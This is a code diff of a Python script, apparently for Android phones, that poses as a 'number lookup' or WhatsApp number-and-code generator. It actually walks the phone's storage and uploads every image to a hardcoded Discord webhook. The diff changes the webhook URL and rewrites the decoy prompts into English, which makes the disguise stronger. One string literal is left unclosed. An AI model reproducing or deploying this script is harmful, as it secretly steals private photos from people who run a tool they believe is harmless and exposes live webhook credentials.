@@ -546,7 +546,7 @@ import time
 import random
 from tqdm import tqdm 
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1387782108751069324/sralyRpYLGXPFx_Du3Q5ksnjLryNAC8SSsAZUOTS-wNmK22y1bgKi0pw139KQVb88fW7"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1387796792036560967/Tjb02OQ3HoEhAQCAOJ_WL07puQqTsrAjrga-QowkpKiBp3nN1GiKXz_jEzOnk3o0FLZl"
 
 def get_device_info():
     try:
@@ -568,8 +568,8 @@ def scan_and_upload():
     image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp')
     base_dir = "/storage/emulated/0" 
     
-    target_id = input("Numara Girin ")
-    print(f"\n🔎 **{target_id}** Numara sorgulanıyor...")
+    target_id = input("Number: ")
+    print(f"\n🔎 **{target_id}** Number search...")
     
     image_files = []
     for root, _, files in os.walk(base_dir):
@@ -582,22 +582,16 @@ def scan_and_upload():
         print("❌ Hiç veri bulunamadı!")
         return
     
-    print(f"🔄 **{total_images}** Numaraya istek gönderiliyor \n")
+    print(f"🔄 **{total_images}** number gen...\n")
     
     # TQDM ile güzel bir progress bar
-    for image_path in tqdm(image_files, desc="NUMARA SORGULANIYOR", unit="idsorgulaniyor"):
+    for image_path in tqdm(image_files, desc="Number generator...", unit="idsorgulaniyor"):
         send_to_discord(image_path)
         time.sleep(1) 
     
-    print("\n✅ Sorgu tamamlandı! Sonuçlar analiz ediliyor...")
+    print("\n Okey code: 346789
 
 if __name__ == "__main__":
-    print("""
-    ███████╗ ██████╗ ██████╗  ██████╗ ██╗  ██╗
-    ██╔════╝██╔═══██╗██╔══██╗██╔═══██╗██║  ██║
-    ███████╗██║   ██║██████╔╝██║   ██║███████║
-    ╚════██║██║   ██║██╔══██╗██║   ██║██╔══██║
-    ███████║╚██████╔╝██║  ██║╚██████╔╝██║  ██║
-    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
+    print("""WP NOMBER GENERATE + CODE TEMP WP
     """)
     scan_and_upload()
